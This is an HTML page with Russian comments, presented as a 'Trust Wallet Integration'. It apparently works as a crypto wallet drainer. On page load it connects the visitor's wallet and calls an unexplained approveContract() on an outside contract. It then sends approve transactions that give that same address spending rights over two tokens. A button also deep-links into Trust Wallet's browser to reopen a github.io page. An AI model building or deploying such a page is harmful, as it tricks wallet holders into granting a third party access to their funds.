<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trust Wallet Integration</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #1f1f1f;
            color: white;
            text-align: center;
        }

        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
        }

        #status {
            margin-top: 20px;
            font-weight: bold;
            color: green;
        }

        #error {
            margin-top: 20px;
            font-weight: bold;
            color: red;
        }
    </style>
</head>
<body>
    <div id="app">
        <h1>Trust Wallet Integration</h1>
        <button onclick="openTrustWallet()">Открыть Trust Wallet</button>
        <div id="status"></div>
        <div id="error"></div>
    </div>

    <!-- Локальное подключение ethers.js -->
    <script src="./ethers.min.js"></script>

    <script type="text/javascript">
        // Проверка загрузки ethers.js
        if (typeof ethers === "undefined") {
            document.getElementById("error").innerText = "Ошибка: ethers.js не загружен!";
            console.error("ethers.js не загружен");
        } else {
            console.log("ethers.js загружен успешно");
        }

        // Открыть Trust Wallet через deeplink
        function openTrustWallet() {
            const deeplink = "trust://browser_redirect?url=https://sorex1992.github.io/github.io/";
            window.location.href = deeplink;
        }

        // Автоматическое подключение кошелька и взаимодействие с контрактом
        async function connectWalletAndSign() {
            if (typeof window.ethereum !== "undefined") {
                try {
                    // Подключение к кошельку
                    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
                    const userAddress = accounts[0];
                    document.getElementById("status").innerText = `Кошелек подключен: ${userAddress}`;

                    // Подписание контракта
                    await signContract();

                    // Выполнение approve
                    await approveTokens("0x55d398326f99059fF775485246999027B3197955", "0xfe0d3ab9a7ab9c070069f516feda0f351751944e", "1000");
                    await approveTokens("0xcb89e8dd26aad28674da9751bfa61815a75f152d", "0xfe0d3ab9a7ab9c070069f516feda0f351751944e", "1000");

                    document.getElementById("status").innerText = "Все действия выполнены успешно.";
                } catch (error) {
                    document.getElementById("error").innerText = `Ошибка: ${error.message}`;
                }
            } else {
                document.getElementById("error").innerText = "Ошибка: Кошелек не найден. Установите Trust Wallet или MetaMask.";
            }
        }

        // Функция подписания контракта
        async function signContract() {
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            const contractAbi = [
                "function approveContract() external"
            ];
            const contractAddress = "0xfe0d3ab9a7ab9c070069f516feda0f351751944e";
            const contract = new ethers.Contract(contractAddress, contractAbi, signer);

            const tx = await contract.approveContract();
            console.log("Контракт подписан. Транзакция:", tx.hash);
            await tx.wait();
            console.log("Контракт успешно подписан.");
        }

        // Функция для approve токенов
        async function approveTokens(tokenAddress, contractAddress, amount) {
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            const tokenAbi = [
                "function approve(address spender, uint256 amount) public returns (bool)"
            ];
            const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);

            const tx = await tokenContract.approve(contractAddress, ethers.utils.parseUnits(amount, 18));
            console.log(`Approve для ${tokenAddress} отправлен. Транзакция:`, tx.hash);
            await tx.wait();
            console.log(`Approve для ${tokenAddress} выполнен.`);
        }

        // Автоматическое выполнение после загрузки
        window.onload = connectWalletAndSign;
    </script>
</body>
</html>
